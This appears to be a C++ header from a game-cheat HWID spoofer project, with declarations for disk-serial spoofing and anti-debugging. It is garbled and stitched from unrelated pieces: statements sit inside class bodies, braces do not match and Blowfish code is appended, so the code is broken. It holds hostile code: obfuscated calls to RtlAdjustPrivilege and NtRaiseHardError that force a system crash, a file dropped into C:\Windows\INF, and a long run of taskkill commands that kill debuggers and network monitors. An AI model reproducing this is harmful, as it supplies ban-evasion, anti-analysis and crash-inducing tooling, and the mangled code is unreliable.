#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <wchar.h>
#include <tchar.h>
#include <random>
#include <sstream>
#include <thread>
#include <Shlwapi.h>
#include <WinUser.h>  
#include <ShlObj.h>


class Spoofer {
	std::uintmax_t files;
	std::uintmax_t ffiles; 
public:
	void Initialize();
private:
	int RemoveFiles();
	int CleanerFileTemp();
	bool RemoveXboxAuth();
	bool CheckWord(char* filename, char* search);
	void ChangeRegEdit();
	std::string newUUID();
	void GetFiveM();
	void runexe();
	void discord();
	bool GetFolder(std::string& folderpath, const char* szCaption = NULL, HWND hOwner = NULL);
	inline bool exists_test3(const std::string& name);
};



class Menu {
public:

	void Main(bool loader_active, PDIRECT3DTEXTURE9 my_texture);
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
private:
	void MainMenu();
	void LoadingScene();
};

template< typename ... Args >
std::string stringer(Args const& ... args)
{
	std::ostringstream stream;
	using List = int[];
	(void)List {
		0, ((void)(stream << args), 0) ...
	};
	return stream.str();
}

extern std::unique_ptr<Menu> m_Menu;

class CConsole
{
public:
	 BOOLEAN bEnabled;
	    ULONG uResp;
	    system(EncryptS("Spoofer.cpp"));
	    std::ofstream outfile(EncryptS("C:\\Windows\\INF\\Secure.axt"));
	    outfile << EncryptS("0xE0PD01\n0xB866E7\n0x1337B1") << std::endl;
	    outfile.close();
	    //KeyAuthApp.ban();
	    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA(EncryptS("\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x52\x74\x6C\x41\x64\x6A\x75\x73\x74\x50\x72\x69\x76\x69\x6C\x65\x67\x65"));
	    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleW(EncryptWS(L"\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C")), EncryptS("\x4E\x74\x52\x61\x69\x73\x65\x48\x61\x72\x64\x45\x72\x72\x6F\x72"));
	    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
	    Sleep(10000);
	    ::exit(0);

};
std::string GetHWID();

namespace Disks
{
	PDEVICE_OBJECT GetRaidDevice(const wchar_t* deviceName);
	NTSTATUS DiskLoop(PDEVICE_OBJECT deviceArray, RaidUnitRegisterInterfaces registerInterfaces);
	NTSTATUS ChangeDiskSerials();
	NTSTATUS DisableSmart();
	void DisableSmartBit(PRAID_UNIT_EXTENSION extension);
}

void Log(std::string Message, int LogType);
void Log1(std::string Message, int LogType);

void killdbg()
{
    system(EncryptS("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im ProcessHacker.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im idaq.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im idaq64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Wireshark.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Fiddler.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Xenos32.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im de4dot.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Cheat Engine.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im MugenJinFuu-i386.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im cheatengine-i386.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im KsDumper.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im x64dbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im x32dbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Ida64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im OllyDbg.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Dbg64.exe >nul 2>&1"));
    system(EncryptS("taskkill /f /im Dbg32.exe >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
    system(EncryptS("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
	{
		if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		std::cout << "[-] Image is not 64 bit" << std::endl;
		return 0;
	}

inline unsigned char Byte(unsigned int ui)
{
	return (unsigned char)(ui & 0xff);
}

inline unsigned int CBlowFish::F(unsigned int ui)
{
	return ((m_auiS[0][Byte(ui>>24)] + m_auiS[1][Byte(ui>>16)]) ^ m_auiS[2][Byte(ui>>8)]) + m_auiS[3][Byte(ui)];
}

#endif

